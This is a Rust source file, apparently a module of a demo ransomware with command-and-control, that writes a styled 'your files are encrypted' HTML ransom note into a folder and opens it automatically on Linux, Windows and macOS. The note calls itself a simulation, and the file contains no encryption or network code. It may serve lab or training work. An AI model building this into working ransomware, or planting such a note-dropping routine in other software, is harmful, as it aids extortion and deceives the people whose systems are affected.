use anyhow::{Context, Result};
use std::fs;
use std::path::Path;

pub fn create_ransom_note(base_path: &Path) -> Result<()> {
    let note_path = base_path.join("README_DECRYPT.html");

    // Einfaches HTML mit Ransom NOte
    let html_content = r#"
    <!doctype html>
    <html lang="en">
        <head>
            <meta charset="utf-8">
            <style>
                body { background-color: #8b0000; color: white; font-family: 'courier new', monospace; text-align: center; padding: 50px; }
                .container { border: 3px solid white; padding: 20px; background-color: black; max-width: 800px; margin: 0 auto; }
                h1 { color: red; text-transform: uppercase; font-size: 3em; }
                p { font-size: 1.2em; }
                .button {
                    background-color: red; color: white; border: 2px solid white; 
                    padding: 15px 32px; text-align: center; text-decoration: none; 
                    display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;
                    font-weight: bold;
                }
                .button:hover { background-color: white; color: red; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>⚠️ your files are encrypted ⚠️</h1>
                <p>don't panic. this is a simulation.</p>
                <p>all your documents, photos, and databases have been encrypted with strong military-grade encryption.</p>
                <br>
                <p>to restore your files, you need the unique private key that we have generated for you.</p>
                
                <hr>
                <h3>how to decrypt?</h3>
                <p>since this is a c2-demo, you cannot decrypt directly from the browser.</p>
                <p><b>please contact the operator (c2 server) and send the command:</b></p>
                <h2>decrypt</h2>
                
                <!-- visueller button -->
                <button class="button" onclick="alert('please send the command \'decrypt\' in your c2 console to trigger the rust process!')">
                    decrypt files now
                </button>
            </div>
        </body>
    </html>
    "#;

    fs::write(&note_path, html_content).context("Konnte Ransom-Note nicht schreiben")?;

    // Versuch die Datei zu öffnen
    #[cfg(target_os = "linux")]
    let _ = std::process::Command::new("xdg-open")
        .arg(&note_path)
        .status();
    #[cfg(target_os = "windows")]
    let _ = std::process::Command::new("cmd")
        .args(["/C", "start", "", &note_path.to_string_lossy()])
        .status();
    #[cfg(target_os = "macos")]
    let _ = std::process::Command::new("open").arg(&note_path).status();

    Ok(())
}
